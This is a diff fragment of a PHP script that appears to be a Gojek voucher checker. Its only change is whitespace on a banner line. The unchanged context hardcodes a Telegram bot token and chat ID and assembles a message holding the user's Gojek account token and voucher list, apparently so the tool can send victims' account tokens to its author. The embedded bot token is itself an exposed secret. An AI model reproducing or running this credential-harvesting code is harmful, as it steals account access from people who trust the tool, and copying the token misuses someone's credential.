@@ -143,7 +143,7 @@ echo color("nevy"," ==========+++++++++==========\n");
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         echo color("nevy","| Creator : bocah bar bar            \n");
-        echo color("nevy","| Selamat Makan Beb :* PakPres        \n");
+         echo color("nevy","| Selamat Makan Beb :* PakPres        \n");
         $TOKEN  = "833122415:AAGyUuqdPo4bNu8NQUozvAh9UIMG4py0hfQ";
     $chatid = "782106563";
     $pesan  = "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
